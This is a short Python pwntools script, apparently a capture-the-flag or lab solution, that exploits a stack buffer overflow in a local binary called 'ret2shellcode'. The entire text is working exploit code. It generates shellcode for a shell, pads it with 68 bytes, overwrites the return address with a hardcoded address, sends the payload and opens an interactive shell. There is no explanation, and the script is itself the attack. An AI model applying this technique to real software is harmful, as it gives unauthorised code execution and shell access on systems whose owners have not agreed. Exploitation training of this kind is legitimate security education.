from pwn import *

io = process("./ret2shellcode")
shellcode = asm(shellcraft.sh())
payload = shellcode + ("A" * 68).encode() + p32(0x0804A080)
io.recvline()
io.sendline(payload)
io.interactive()
